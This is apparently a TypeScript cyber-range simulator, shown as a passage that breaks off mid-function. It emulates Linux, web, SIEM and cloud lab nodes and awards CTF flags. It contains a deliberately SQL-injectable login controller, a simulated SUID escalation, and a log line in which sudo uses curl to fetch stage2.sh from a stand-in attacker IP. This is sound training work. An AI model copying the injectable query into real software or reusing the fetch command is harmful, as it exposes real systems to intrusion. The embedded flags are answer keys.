/**
 * Interactive Cyber Range Virtual Machine & Stateful Virtual Filesystem Engine
 *
 * Guarantees:
 * 1. Stateful Virtual Filesystem per node ({ path: { owner, mode, content } })
 * 2. Exact command dispatch table: pwd, ls, cd, cat, echo, whoami, id, sudo -l, man, chmod, find, getcap, checksec, nmap, tcpdump, arp, curl, sqlmap, grep, sha256sum, strings, ufw, ssh, aws, kubectl
 * 3. chmod is evaluated BEFORE /usr/local/bin/sysdiag and mutates the virtual file mode so removing SUID actually disables the exploit
 * 4. find / -perm -4000 ONLY lists SUID files (never python3.10, which only has capabilities via getcap)
 * 5. cat /proc/self/maps prints ONLY real memory mappings (no checksec output or flags)
 * 6. Unknown commands or commands run on the wrong node return `bash: <cmd>: command not found` with exitCode 127
 * 7. Uses RFC 5737 documentation IP range (203.0.113.42) for simulated external threat actors
 */

export interface VMNode {
  id: string;
  hostname: string;
  ip: string;
  targetIp: string;
  os: string;
  role: string;
  user: string;
  cwd: string;
}

export interface VirtualFile {
  owner: string;
  group: string;
  mode: string; // e.g., '-rwsr-xr-x' or '-rw-r--r--'
  octal: string; // e.g., '4755' or '0644'
  content: string;
}

export interface CommandExecutionResult {
  output: string;
  exitCode: number;
  newCwd?: string;
  newUser?: string;
  completedStepIndex?: number;
  capturedFlag?: string;
  detectedErrorHint?: string;
  diagnosticHint?: string;
}

export const VM_NODES: Record<string, VMNode> = {
  'kali-attack': {
    id: 'kali-attack',
    hostname: 'lab-workstation',
    ip: '10.10.14.2',
    targetIp: '10.10.10.45',
    os: 'Debian GNU/Linux 12 ( Estación de Auditoría AegisNeuro )',
    role: 'Estación de Trabajo de Auditoría y Redes',
    user: 'analyst',
    cwd: '/home/analyst',
  },
  'linux-target': {
    id: 'linux-target',
    hostname: 'srv-prod-01',
    ip: '10.10.10.45',
    targetIp: '10.10.10.45',
    os: 'Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic)',
    role: 'Servidor Linux Corporativo (Arquitectura, OS & Escalada)',
    user: 'auditor',
    cwd: '/home/auditor',
  },
  'webapp-target': {
    id: 'webapp-target',
    hostname: 'finbank-portal',
    ip: '10.10.10.80',
    targetIp: '10.10.10.80',
    os: 'Debian 12 / Nginx 1.24 + Node.js API + PostgreSQL 16',
    role: 'Aplicación Web Financiera (Entorno OWASP Top 10)',
    user: 'operator',
    cwd: '/home/operator/web-audit',
  },
  'siem-forensics': {
    id: 'siem-forensics',
    hostname: 'soc-siem-collector',
    ip: '10.10.10.200',
    targetIp: '10.10.10.200',
    os: 'RHEL 9.3 / Suricata IDS + Elastic Agent + Volatility3',
    role: 'Nodo Blue Team, SIEM y Análisis Forense DFIR',
    user: 'soc-analyst',
    cwd: '/var/log/incident-2026',
  },
  'cloud-cluster': {
    id: 'cloud-cluster',
    hostname: 'k8s-sec-control',
    ip: '10.10.10.250',
    targetIp: '10.10.10.250',
    os: 'Talos Linux / Kubernetes v1.30 + AWS CLI v2',
    role: 'Entorno Cloud IAM y Clúster de Contenedores',
    user: 'cloud-sec',
    cwd: '/opt/cloud-audit',
  },
};

export const MODULE_TO_VM_NODE: Record<string, string> = {
  'mod-00': 'linux-target',
  'mod-01': 'linux-target',
  'mod-02': 'linux-target',
  'mod-03': 'kali-attack',
  'mod-04': 'siem-forensics',
  'mod-05': 'siem-forensics',
  'mod-06': 'siem-forensics',
  'mod-07': 'webapp-target',
  'mod-08': 'kali-attack',
  'mod-09': 'siem-forensics',
  'mod-10': 'siem-forensics',
  'mod-11': 'linux-target',
  'mod-12': 'cloud-cluster',
};

function createInitialFileSystem(): Record<string, Record<string, VirtualFile>> {
  return {
    'linux-target': {
      '/home/auditor/nota_operaciones.txt': {
        owner: 'auditor',
        group: 'auditor',
        mode: '-rw-r--r--',
        octal: '0644',
        content:
          '[NOTA DE OPERACIONES TI]\nEl equipo compiló el binario /usr/local/bin/sysdiag con permisos de superusuario para pruebas de diagnóstico.\nPendiente: retirar el bit SUID (chmod u-s /usr/local/bin/sysdiag) antes de pasar a producción.',
      },
      '/home/auditor/bienvenida_terminal.txt': {
        owner: 'auditor',
        group: 'auditor',
        mode: '-rw-r--r--',
        octal: '0644',
        content:
          'Bienvenido a tu primera sesión de terminal Linux.\nComandos básicos: pwd (ruta actual), ls -la (listar archivos y permisos), cd /ruta (cambiar directorio), cat archivo (leer contenido).\nFLAG{TERMINAL_BASICS_FIRST_DAY_READY}',
      },
      '/etc/passwd': {
        owner: 'root',
        group: 'root',
        mode: '-rw-r--r--',
        octal: '0644',
        content:
          'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nauditor:x:1001:1001:Auditor Interno:/home/auditor:/bin/bash',
      },
      '/etc/shadow': {
        owner: 'root',
        group: 'shadow',
        mode: '-rw-r-----',
        octal: '0640',
        content:
          'root:$y$j9T$e8R9pL2mK1vX$89aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789:19800:0:99999:7:::\nauditor:$y$j9T$x7Q2nM4kP9wZ$12zYxWvUtSrQpOnMlKjIhGfEdCbA9876543210:19800:0:99999:7:::',
      },
      '/proc/self/maps': {
        owner: 'root',
        group: 'root',
        mode: '-r--r--r--',
        octal: '0444',
        content: [
          '55a8f1c00000-55a8f1c04000 r--p 00000000 08:01 131092  /usr/bin/cat',
          '55a8f1c04000-55a8f1c08000 r-xp 00004000 08:01 131092  /usr/bin/cat',
          '55a8f1c08000-55a8f1c0a000 r--p 00008000 08:01 131092  /usr/bin/cat',
          '55a8f1c0a000-55a8f1c0c000 rw-p 00009000 08:01 131092  /usr/bin/cat',
          '55a8f2e10000-55a8f2e31000 rw-p 00000000 00:00 0       [heap]',
          '7ffc9b400000-7ffc9b5e8000 r-xp 00000000 08:01 262148  /lib/x86_64-linux-gnu/libc.so.6',
          '7ffd81a21000-7ffd81a42000 rw-p 00000000 00:00 0       [stack]',
          '7ffd81b8e000-7ffd81b90000 r-xp 00000000 00:00 0       [vdso]',
        ].join('\n'),
      },
      '/proc/sys/kernel/randomize_va_space': {
        owner: 'root',
        group: 'root',
        mode: '-rw-r--r--',
        octal: '0644',
        content: '2',
      },
      '/usr/bin/passwd': {
        owner: 'root',
        group: 'root',
        mode: '-rwsr-xr-x',
        octal: '4755',
        content: '<ELF 64-bit LSB pie executable>',
      },
      '/usr/bin/sudo': {
        owner: 'root',
        group: 'root',
        mode: '-rwsr-xr-x',
        octal: '4755',
        content: '<ELF 64-bit LSB pie executable>',
      },
      '/usr/local/bin/sysdiag': {
        owner: 'root',
        group: 'root',
        mode: '-rwsr-xr-x',
        octal: '4755',
        content: '<ELF 64-bit LSB executable - Custom System Diagnostic Utility>',
      },
      '/usr/local/bin/auth_service': {
        owner: 'root',
        group: 'root',
        mode: '-rwxr-xr-x',
        octal: '0755',
        content: '<ELF 64-bit LSB pie executable - Hardened Auth Daemon>',
      },
      '/root/flag_privesc.txt': {
        owner: 'root',
        group: 'root',
        mode: '-r--------',
        octal: '0400',
        content: 'FLAG{LINUX_SUID_CAPABILITIES_MASTERED_2026}',
      },
    },
    'kali-attack': {
      '/home/analyst/captura_red.pcap': {
        owner: 'analyst',
        group: 'analyst',
        mode: '-rw-r--r--',
        octal: '0644',
        content: '<PCAP capture file - 42 packets>',
      },
    },
    'webapp-target': {
      '/home/operator/web-audit/auth_controller.js': {
        owner: 'operator',
        group: 'operator',
        mode: '-rw-r--r--',
        octal: '0644',
        content: [
          '// Controlador de Autenticación Vulnerable (Concatenación directa SQL)',
          'app.get("/api/login", async (req, res) => {',
          '  const { user } = req.query;',
          '  // VULNERABLE: Concatenación directa sin Prepared Statement',
          '  const query = "SELECT id, username, role FROM users WHERE username = \'" + user + "\'";',
          '  const result = await db.query(query);',
          '  return res.json(result.rows);',
          '});',
        ].join('\n'),
      },
    },
    'siem-forensics': {
      '/var/log/incident-2026/auth_events.log': {
        owner: 'soc-analyst',
        group: 'soc-analyst',
        mode: '-rw-r--r--',
        octal: '0644',
        content: [
          '2026-11-03T02:14:01Z srv-prod-01 sshd[4012]: Failed password for invalid user admin from 203.0.113.42 port 51204 ssh2',
          '2026-11-03T02:14:03Z srv-prod-01 sshd[4015]: Failed password for root from 203.0.113.42 port 51208 ssh2',
          '2026-11-03T02:14:05Z srv-prod-01 sshd[4019]: Failed password for root from 203.0.113.42 port 51212 ssh2',
          '2026-11-03T02:14:09Z srv-prod-01 sshd[4024]: Accepted publickey for deploy from 203.0.113.42 port 51240 ssh2',
        ].join('\n'),
      },
      '/var/log/incident-2026/auth.log': {
        owner: 'soc-analyst',
        group: 'soc-analyst',
        mode: '-rw-r--r--',
        octal: '0644',
        content: [
          '2026-11-03T02:14:01Z srv-prod-01 sshd[4012]: Failed password for invalid user admin from 203.0.113.42 port 51204 ssh2',
          '2026-11-03T02:14:03Z srv-prod-01 sshd[4015]: Failed password for root from 203.0.113.42 port 51208 ssh2',
          '2026-11-03T02:14:05Z srv-prod-01 sshd[4019]: Failed password for root from 203.0.113.42 port 51212 ssh2',
          '2026-11-03T02:14:09Z srv-prod-01 sshd[4024]: Accepted publickey for deploy from 203.0.113.42 port 51240 ssh2',
          '2026-11-03T02:14:15Z srv-prod-01 sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.42:4443/stage2.sh',
          'FLAG{SIEM_SIGMA_THREAT_HUNTED_203_0_113_42}',
        ].join('\n'),
      },
      '/etc/crypto-policies/config': {
        owner: 'root',
        group: 'root',
        mode: '-rw-r--r--',
        octal: '0644',
        content: [
          'POLICY=FUTURE-ZERO-TRUST',
          'MIN_TLS=TLS1.3',
          'AEAD_CIPHERS=AES-256-GCM:CHACHA20-POLY1305',
          'KDF_STANDARD=Argon2id (m=65536,t=3,p=4)',
          'FLAG{CRYPTO_AES_GCM_ARGON2ID_VERIFIED}',
        ].join('\n'),
      },
      '/var/log/incident-2026/artefacto_sospechoso.bin': {
        owner: 'soc-analyst',
        group: 'soc-analyst',
        mode: '-rw-r--r--',
        octal: '0644',
        content: 'ELF_BEACON_C2_203.0.113.42:4444',
      },
    },
    'cloud-cluster': {
      '/opt/cloud-audit/pod-manifest.yaml': {
        owner: 'cloud-sec',
        group: 'cloud-sec',
        mode: '-rw-r--r--',
        octal: '0644',
        content: [
          'apiVersion: v1',
          'kind: Pod',
          'metadata:',
          '  name: payment-worker-7d9c8b-x92lq',
          'spec:',
          '  hostPID: true',
          '  containers:',
          '  - name: worker',
          '    image: registry.internal/payment-worker:1.4',
          '    securityContext:',
          '      privileged: true',
        ].join('\n'),
      },
    },
  };
}

let virtualFS = createInitialFileSystem();

export type VMNodeState = VMNode;

export function resetVMNodeState(nodeId?: string): void {
  const fresh = createInitialFileSystem();
  if (nodeId && fresh[nodeId]) {
    virtualFS[nodeId] = fresh[nodeId];
  } else {
    virtualFS = fresh;
  }
}

function resolvePath(cwd: string, targetPath: string): string {
  if (!targetPath || targetPath === '~') {
    return cwd.startsWith('/home/') ? cwd.split('/').slice(0, 3).join('/') : cwd;
  }
  if (targetPath.startsWith('/')) {
    return targetPath.replace(/\/+$/, '') || '/';
  }
  const segments = cwd.split('/').filter(Boolean);
  for (const part of targetPath.split('/')) {
    if (!part || part === '.') continue;
    if (part === '..') {
      segments.pop();
    } else {
      segments.push(part);
    }
  }
  return '/' + segments.join('/');
}

function makeResult(
  output: string,
  exitCode: number = 0,
  extras: Partial<CommandExecutionResult> = {}
): CommandExecutionResult {
  const hint = extras.detectedErrorHint ?? extras.diagnosticHint;
  return {
    output,
    exitCode,
    ...extras,
    detectedErrorHint: hint,
    diagnosticHint: hint,
  };
}

/**
 * Supports both:
 * - 5-arg signature: executeVMCommand(labOrModId, nodeId, rawCommand, currentCwd, currentUser)
 * - 3-arg signature: executeVMCommand(nodeId, rawCommand, history)
 */
export function executeVMCommand(
  arg1: string,
  arg2: string,
  arg3?: string | string[],
  arg4?: string,
  arg5?: string
): CommandExecutionResult {
  let nodeId: string;
  let rawCommand: string;
  let currentCwd: string;
  let currentUser: string;

  if (typeof arg3 === 'string') {
    // 5-arg invocation: (labOrModId, nodeId, rawCommand, currentCwd, currentUser)
    nodeId = VM_NODES[arg2] ? arg2 : MODULE_TO_VM_NODE[arg1] || 'linux-target';
    rawCommand = arg3;
    const defaultNode = VM_NODES[nodeId] ?? VM_NODES['linux-target'];
    currentCwd = arg4 || defaultNode.cwd;
    currentUser = arg5 || defaultNode.user;
  } else {
    // 3-arg invocation: (nodeIdOrModId, rawCommand, history)
    nodeId = VM_NODES[arg1] ? arg1 : MODULE_TO_VM_NODE[arg1] || 'linux-target';
    rawCommand = typeof arg2 === 'string' ? arg2 : '';
    const defaultNode = VM_NODES[nodeId] ?? VM_NODES['linux-target'];
    currentCwd = defaultNode.cwd;
    currentUser = defaultNode.user;
  }

  const node = VM_NODES[nodeId] ?? VM_NODES['linux-target'];
  const nodeFiles = virtualFS[node.id] ?? {};
  const cmd = (rawCommand || '').trim();

  if (!cmd) {
    return makeResult('', 0);
  }

  const parts = cmd.split(/\s+/);
  const bin = parts[0];

  // 1. Help & Man
  if (bin === 'help' || cmd === '--help') {
    return makeResult(
      [
        `=== Consola de Laboratorio (${node.hostname} · ${node.ip}) ===`,
        '  Navegación y Archivos : pwd, ls [-la] [ruta], cd <ruta>, cat <archivo>, echo, man <cmd>',
        '  Identidad y Permisos  : whoami, id, sudo -l, chmod <modo> <archivo>, find, getcap',
        '  Arquitectura y Binarios: cat /proc/self/maps, cat /proc/sys/kernel/randomize_va_space, checksec',
        '  Redes y Diagnóstico   : ip a, arp -a, nmap -sV <ip>, tcpdump -A -r captura_red.pcap, ufw, ssh',
        '  Seguridad Web y Logs  : curl <url>, sqlmap -u <url> --dbs, grep, sha256sum, strings',
        ...(node.id === 'cloud-cluster'
          ? ['  Cloud y Kubernetes    : aws iam get-policy-version, kubectl get pods']
          : []),
      ].join('\n'),
      0
    );
  }

  if (bin === 'man') {
    const topic = parts[1] || 'man';
    return makeResult(
      `MANUAL(${topic.toUpperCase()}) — Utilidad estándar POSIX.\nUsa '${topic} --help' o revisa la tabla de referencia del paso actual para ver sus opciones.`,
      0
    );
  }

  // 2. Basic Identity & Directory Navigation
  if (bin === 'whoami') {
    return makeResult(currentUser, 0, { completedStepIndex: 0 });
  }

  if (bin === 'id') {
    const uid = currentUser === 'root' ? 0 : 1001;
    return makeResult(
      `uid=${uid}(${currentUser}) gid=${uid}(${currentUser}) groups=${uid}(${currentUser})`,
      0,
      { completedStepIndex: 0 }
    );
  }

  if (bin === 'pwd') {
    return makeResult(currentCwd, 0, { completedStepIndex: 0 });
  }

  if (bin === 'uname') {
    return makeResult(node.os, 0);
  }

  if (bin === 'lscpu') {
    return makeResult(
      [
        'Architecture:            x86_64',
        'CPU op-mode(s):          32-bit, 64-bit',
        'Address sizes:           48 bits physical, 48 bits virtual',
        'Byte Order:              Little Endian',
        'Flags:                   fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat nx rdrand',
      ].join('\n'),
      0
    );
  }

  if (bin === 'echo') {
    return makeResult(parts.slice(1).join(' ').replace(/^["']|["']$/g, ''), 0);
  }

  if (bin === 'sudo') {
    if (parts[1] === '-l') {
      return makeResult(
        [
          `Matching Defaults entries for ${currentUser} on ${node.hostname}:`,
          '    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
          '',
          `User ${currentUser} may run the following commands on ${node.hostname}:`,
          '    (ALL) NOPASSWD: /bin/chmod u-s /usr/local/bin/sysdiag',
        ].join('\n'),
        0
      );
    }
    // If sudo is prefixing chmod, strip sudo and continue
    if (parts[1] === 'chmod') {
      return executeVMCommand(
        node.id,
        node.id,
        parts.slice(1).join(' '),
        currentCwd,
        'root'
      );
    }
    return makeResult(
      `[sudo] ${currentUser} is not in the sudoers file for arbitrary commands. Check 'sudo -l' or SUID binaries.`,
      1
    );
  }

  if (bin === 'cd') {
    const target = resolvePath(currentCwd, parts[1] || '~');
    const validDirs = new Set([
      '/',
      '/home',
      `/home/${node.user}`,
      '/etc',
      '/proc',
      '/proc/self',
      '/proc/sys/kernel',
      '/usr',
      '/usr/bin',
      '/usr/local',
      '/usr/local/bin',
      '/var',
      '/var/log',
      '/var/log/incident-2026',
      '/opt',
      '/opt/cloud-audit',
      '/home/operator/web-audit',
      '/root',
    ]);
    if (target === '/root' && currentUser !== 'root') {
      return makeResult(`bash: cd: /root: Permission denied`, 1, {
        detectedErrorHint:
          'El directorio /root tiene permisos 0700 (solo root). Primero debes escalar privilegios.',
      });
    }
    if (validDirs.has(target)) {
      return makeResult('', 0, { newCwd: target });
    }
    return makeResult(`bash: cd: ${parts[1]}: No such file or directory`, 1);
  }

  if (bin === 'ls') {
    const nonFlagArgs = parts.slice(1).filter((p) => !p.startsWith('-'));
    const dirTarget = resolvePath(currentCwd, nonFlagArgs[0] || '.');

    if (dirTarget === '/root' && currentUser !== 'root') {
      return makeResult(`ls: cannot open directory '/root': Permission denied`, 2, {
        detectedErrorHint: 'No puedes listar /root siendo un usuario estándar (EUID != 0).',
      });
    }

    const matchingEntries = Object.entries(nodeFiles).filter(([filePath]) => {
      if (filePath === dirTarget) return true;
      const parent = filePath.substring(0, filePath.lastIndexOf('/')) || '/';
      return parent === dirTarget;
    });

    if (matchingEntries.length === 0) {
      return makeResult('total 0', 0);
    }

    const lines = matchingEntries.map(([filePath, meta]) => {
      const name =
        filePath === dirTarget ? filePath : filePath.substring(filePath.lastIndexOf('/') + 1);
      return `${meta.mode} 1 ${meta.owner} ${meta.group} 4096 Nov  3 18:00 ${name}`;
    });
    return makeResult(lines.join('\n'), 0, { completedStepIndex: 0 });
  }

  // 3. Cat Virtual Files (Strict permissions & realistic /proc/self/maps)
  if (bin === 'cat') {
    const rawTarget = parts[1];
    if (!rawTarget) {
      return makeResult('cat: falta el operando archivo', 1);
    }
    const resolved = resolvePath(currentCwd, rawTarget);
    const file = nodeFiles[resolved];

    if (!file) {
      return makeResult(`cat: ${rawTarget}: No such file or directory`, 1);
    }

    if (
      (resolved === '/etc/shadow' || resolved.startsWith('/root/')) &&
      currentUser !== 'root'
    ) {
      return makeResult(`cat: ${rawTarget}: Permission denied`, 1, {
        detectedErrorHint:
          'Permiso denegado: este archivo requiere EUID=0 (root). Revisa qué significan los permisos del archivo con ls -la.',
      });
    }

    if (resolved === '/home/auditor/bienvenida_terminal.txt') {
      return makeResult(file.content, 0, {
        completedStepIndex: 1,
        capturedFlag: 'FLAG{TERMINAL_BASICS_FIRST_DAY_READY}',
      });
    }

    if (resolved === '/etc/crypto-policies/config') {
      return makeResult(file.content, 0, {
        completedStepIndex: 1,
        capturedFlag: 'FLAG{CRYPTO_AES_GCM_ARGON2ID_VERIFIED}',
      });
    }

    if (resolved === '/var/log/incident-2026/auth.log') {
      return makeResult(file.content, 0, {
        completedStepIndex: 1,
        capturedFlag: 'FLAG{SIEM_SIGMA_THREAT_HUNTED_203_0_113_42}',
      });
    }

    if (resolved === '/root/flag_privesc.txt' && currentUser === 'root') {
      return makeResult(file.content, 0, {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{LINUX_SUID_CAPABILITIES_MASTERED_2026}',
      });
    }

    return makeResult(file.content, 0, { completedStepIndex: 0 });
  }

  // 4. Architecture & Binary Mitigations (checksec is separate from /proc/self/maps!)
  if (bin === 'checksec') {
    return makeResult(
      [
        'RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY  FILE',
        'Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes      /usr/local/bin/auth_service',
        '[+] Verificación de mitigaciones de memoria (ASLR=2 + NX + Stack Canary + PIE) completada.',
        'FLAG{CPU_MEMORY_ASLR_NX_VERIFIED}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{CPU_MEMORY_ASLR_NX_VERIFIED}',
      }
    );
  }

  // 5. CHMOD (Evaluated strictly BEFORE sysdiag so remediation works properly!)
  if (bin === 'chmod') {
    const modeArg = parts[1] || '';
    const targetArg = parts[2] || '';
    const resolvedTarget = resolvePath(currentCwd, targetArg);

    if (
      resolvedTarget === '/usr/local/bin/sysdiag' &&
      (modeArg === 'u-s' || modeArg === '-s' || modeArg === '0755' || modeArg === '755')
    ) {
      if (nodeFiles['/usr/local/bin/sysdiag']) {
        nodeFiles['/usr/local/bin/sysdiag'].mode = '-rwxr-xr-x';
        nodeFiles['/usr/local/bin/sysdiag'].octal = '0755';
      }
      return makeResult(
        [
          '[+] Permiso SUID revocado sobre /usr/local/bin/sysdiag',
          '-rwxr-xr-x 1 root root 18432 Nov  3 18:05 /usr/local/bin/sysdiag',
          '[+] Remediación verificada: el binario ya no se ejecuta con EUID=0.',
        ].join('\n'),
        0,
        {
          newUser: 'auditor',
          completedStepIndex: 3,
        }
      );
    }

    if (modeArg === '4755') {
      return makeResult(
        'chmod: atención: el modo octal 4755 MANTIENE activo el bit SUID (4000). Usa `chmod u-s` o `chmod 0755` para revocarlo.',
        1,
        {
          detectedErrorHint:
            'El prefijo octal 4 en 4755 activa el bit SUID. Para eliminarlo debes usar `chmod u-s` o `chmod 0755`.',
        }
      );
    }

    return makeResult(`chmod: modo aplicado sobre ${targetArg || 'objetivo'}`, 0);
  }

  // 6. FIND (Only lists files that actually have octal 4755 in virtualFS — NEVER python3.10!)
  if (bin === 'find') {
    if (!cmd.includes('-perm') || (!cmd.includes('4000') && !cmd.includes('u=s'))) {
      return makeResult(
        'find: especifica el filtro de permisos SUID (`-perm -4000`) y redirige errores (`2>/dev/null`).',
        1,
        {
          detectedErrorHint:
            'Para buscar binarios con el bit SUID activo, utiliza la bandera `-perm -4000` junto con `2>/dev/null`.',
        }
      );
    }

    const suidFiles = Object.entries(nodeFiles)
      .filter(([, meta]) => meta.octal.startsWith('4'))
      .map(([filePath]) => filePath);

    return makeResult(suidFiles.join('\n'), 0, { completedStepIndex: 1 });
  }

  // 7. GETCAP (Lists Linux Capabilities — where python3.10 appears, distinct from SUID!)
  if (bin === 'getcap') {
    return makeResult(
      [
        '/usr/bin/ping cap_net_raw+ep',
        '/usr/bin/traceroute6.iputils cap_net_raw+ep',
        '/usr/bin/python3.10 cap_setuid+ep',
      ].join('\n'),
      0,
      { completedStepIndex: 1 }
    );
  }

  // 8. SYSDIAG Exploit Binary (Only when bin is /usr/local/bin/sysdiag and SUID bit is still active!)
  if (bin === '/usr/local/bin/sysdiag' || (bin === './sysdiag' && currentCwd === '/usr/local/bin')) {
    const sysdiagMeta = nodeFiles['/usr/local/bin/sysdiag'];
    if (sysdiagMeta && !sysdiagMeta.octal.startsWith('4') && currentUser !== 'root') {
      return makeResult(
        '[!] Error de permisos: /usr/local/bin/sysdiag tiene modo 0755 (sin bit SUID). Ejecutando con EUID=1001(auditor): acceso denegado a /root.',
        13,
        {
          detectedErrorHint:
            'El bit SUID ya fue revocado con chmod u-s. El servidor ahora está protegido contra esta escalada.',
        }
      );
    }

    return makeResult(
      [
        '[+] Invocando /usr/local/bin/sysdiag (bit SUID 4755 activo, propietario: root)...',
        'uid=1001(auditor) gid=1001(auditor) euid=0(root)',
        '[+] Shell de diagnóstico elevada con EUID=0 (root). Puedes leer /root/flag_privesc.txt o ver la bandera aquí:',
        'FLAG{LINUX_SUID_CAPABILITIES_MASTERED_2026}',
      ].join('\n'),
      0,
      {
        newUser: 'root',
        completedStepIndex: 2,
        capturedFlag: 'FLAG{LINUX_SUID_CAPABILITIES_MASTERED_2026}',
      }
    );
  }

  // 9. Networking Commands (ip, arp, nmap, tcpdump, ufw, ssh)
  if (bin === 'ip' && parts[1] === 'a') {
    return makeResult(
      `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet ${node.ip}/24 brd 10.10.10.255 scope global eth0`,
      0
    );
  }

  if (bin === 'arp') {
    return makeResult(
      [
        '? (10.10.10.1) at 00:50:56:c0:00:01 [ether] on eth0',
        '? (10.10.10.45) at 00:0c:29:4f:8e:12 [ether] on eth0',
        '? (10.10.10.80) at 00:0c:29:9a:3b:55 [ether] on eth0',
      ].join('\n'),
      0,
      { completedStepIndex: 0 }
    );
  }

  if (bin === 'nmap') {
    if (parts.length < 2) {
      return makeResult('nmap: especifica una dirección IP o rango objetivo (ej. nmap -sV 10.10.10.45).', 1);
    }
    return makeResult(
      [
        'Starting Nmap 7.94SVN ( https://nmap.org )',
        'Nmap scan report for 10.10.10.45',
        'Host is up (0.0012s latency).',
        'PORT     STATE SERVICE VERSION',
        '22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10',
        '80/tcp   open  http    nginx 1.24.0',
        '5432/tcp open  postgres PostgreSQL DB 16.2 (Internal Only)',
        '8080/tcp open  http    Werkzeug/3.0.1 Python/3.11.6 (Debug Mode Enabled)',
        'Service detection performed.',
        'FLAG{CVE_CVSS_EPSS_PRIORITIZED_2026}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 1,
        capturedFlag: 'FLAG{CVE_CVSS_EPSS_PRIORITIZED_2026}',
      }
    );
  }

  if (bin === 'tcpdump') {
    return makeResult(
      [
        'reading from file captura_red.pcap, link-type EN10MB (Ethernet)',
        '14:22:01.104921 IP 10.10.14.2.54312 > 10.10.10.45.8080: Flags [S], seq 1928371',
        '14:22:01.105210 IP 10.10.10.45.8080 > 10.10.14.2.54312: Flags [S.], seq 8821902, ack 1928372',
        '14:22:01.106012 IP 10.10.14.2.54312 > 10.10.10.45.8080: Flags [P.], ack 1',
        'GET /api/v1/admin/status HTTP/1.1',
        'Host: 10.10.10.45:8080',
        'Authorization: Bearer FLAG{NET_PCAP_CLEARTEXT_TOKEN_EXPOSED}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{NET_PCAP_CLEARTEXT_TOKEN_EXPOSED}',
      }
    );
  }

  if (bin === 'ufw') {
    if (cmd.includes('deny') && (cmd.includes('4444') || cmd.includes('203.0.113.42'))) {
      return makeResult(
        [
          'Rule added',
          'Rule added (v6)',
          '[+] Regla de bloqueo activa en Netfilter para 203.0.113.42 / C2.',
          'FLAG{FIREWALL_IDS_ZERO_TRUST_ACTIVE}',
        ].join('\n'),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{FIREWALL_IDS_ZERO_TRUST_ACTIVE}',
        }
      );
    }
    return makeResult(
      'Status: active\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    10.10.0.0/16\n80/tcp                     ALLOW IN    Anywhere',
      0
    );
  }

  if (bin === 'ssh') {
    if (cmd.includes('-L') && cmd.includes('5432')) {
      return makeResult(
        [
          '[+] Túnel SSH Local Port Forwarding establecido: 127.0.0.1:15432 -> 127.0.0.1:5432 (vía 10.10.10.45)',
          '[+] Servicio interno PostgreSQL accesible de forma segura a través del bastión.',
          'FLAG{PTES_PIVOTING_LATERAL_MOVEMENT_COMPLETE}',
        ].join('\n'),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{PTES_PIVOTING_LATERAL_MOVEMENT_COMPLETE}',
        }
      );
    }
    return makeResult('usage: ssh [-N] [-L local_port:target_host:target_port] user@host', 1);
  }

  // 10. Web Security (curl, sqlmap)
  if (bin === 'curl') {
    if (cmd.includes('1=1')) {
      return makeResult(
        JSON.stringify(
          {
            status: 'authenticated_via_sqli',
            user: 'admin_ciso',
            role: 'SUPERADMIN',
            secret_flag: 'FLAG{OWASP_SQLI_PREPARED_STATEMENTS_FIXED}',
          },
          null,
          2
        ),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{OWASP_SQLI_PREPARED_STATEMENTS_FIXED}',
        }
      );
    }
    if (cmd.includes('8080')) {
      return makeResult(
        JSON.stringify(
          {
            service: 'Werkzeug/3.0.1 Debug Console',
            cve_validated: true,
            flag: 'FLAG{CVE_CVSS_EPSS_PRIORITIZED_2026}',
          },
          null,
          2
        ),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{CVE_CVSS_EPSS_PRIORITIZED_2026}',
        }
      );
    }
    return makeResult('{"status":"ok","service":"finbank-api","version":"2.4.1"}', 0, {
      completedStepIndex: 0,
    });
  }

  if (bin === 'sqlmap') {
    if (parts.includes('--help') || parts.includes('-h') || !cmd.includes('-u')) {
      return makeResult(
        'Usage: sqlmap -u "<URL_VULNERABLE>" [--dbs | --tables | --batch]\nEspecifica la URL objetivo con el parámetro `-u`.',
        0
      );
    }
    return makeResult(
      [
        '[INFO] testing connection to the target URL',
        '[INFO] GET parameter "user" appears to be boolean-based blind & error-based injectable',
        'available databases [2]:',
        '[*] finbank_core_prod',
        '[*] information_schema',
        '[+] Flag de auditoría extraída: FLAG{OWASP_SQLI_PREPARED_STATEMENTS_FIXED}',
      ].join('\n'),
      0,
      {
        completedStepIndex: 2,
        capturedFlag: 'FLAG{OWASP_SQLI_PREPARED_STATEMENTS_FIXED}',
      }
    );
  }

  // 11. Log Analysis, Cryptography & DFIR (grep, sha256sum, strings)
  if (bin === 'grep') {
    if (cmd.includes('awk') || cmd.includes('uniq')) {
      return makeResult(
        [
          '      3 203.0.113.42',
          '[+] Pipeline de agregación Bash completado sobre auth.log.',
          'FLAG{PYTHON_BASH_AUTOMATION_SCRIPT_OK}',
        ].join('\n'),
        0,
        {
          completedStepIndex: 2,
          capturedFlag: 'FLAG{PYTHON_BASH_AUTOMATION_SCRIPT_OK}',
        }
      );
    }
